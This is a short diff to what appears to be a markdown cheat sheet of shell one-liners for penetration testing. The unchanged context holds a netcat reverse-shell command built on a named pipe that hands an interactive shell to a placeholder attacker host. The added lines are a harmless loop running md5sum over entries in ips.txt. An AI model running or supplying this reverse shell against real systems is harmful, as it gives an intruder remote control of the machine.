@@ -32,3 +32,7 @@ or if no `-e`
 mkfifo /tmp/f
 cat /tmp/f | /bin/sh -i 2>&1 | nc attacker ip listening port > /tmp/f
 ```
+### do things to entires in IPs.txt
+```bash
+for ip in `cat ips.txt`; do md5sum $ip; done >> something.txt
+```
